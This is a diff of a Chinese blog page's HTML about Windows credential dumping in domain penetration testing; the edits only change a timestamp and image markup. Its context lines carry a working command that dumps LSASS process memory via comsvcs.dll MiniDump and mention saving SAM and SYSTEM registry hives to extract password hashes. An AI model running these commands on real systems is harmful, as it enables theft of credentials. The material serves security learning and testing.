@@ -25,7 +25,7 @@
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16243b28011f4ba7fcaa41">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16246ea3725939b7b0b112">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5dab25b732f2ca14fb88e4fe">
-<meta property="og:updated_time" content="2019-10-19T15:08:04.000Z">
+<meta property="og:updated_time" content="2019-10-20T05:03:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【域渗透】Credential Access Dumping">
 <meta name="twitter:description" content="凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。 SAM(Security Accounts Manager)windows下的密码(HASH值)由SAM数据库储存，位置在C:\windows\system32\config\sam  0x01 注册表1234567Reg从注册表提取SAM：reg save HKLM\SYSTEM sys.">
@@ -189,7 +189,8 @@
 <p><a href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</a></p>
 <p>由于comsvcs.dll导出函数中包含MiniDumpW,故使用该系统dll实现dump指定进程文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 984 C:\lsass.dmp full&quot;</span><br></pre></td></tr></table></figure>
-<p>如下：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5dab25b732f2ca14fb88e4fe" alt=""></p>
+<pre><code>如下：
+</code></pre><p><img src="https://www.yunzhijia.com/microblog/filesvr/5dab25b732f2ca14fb88e4fe" alt=""></p>
 
   </div>
 </article>
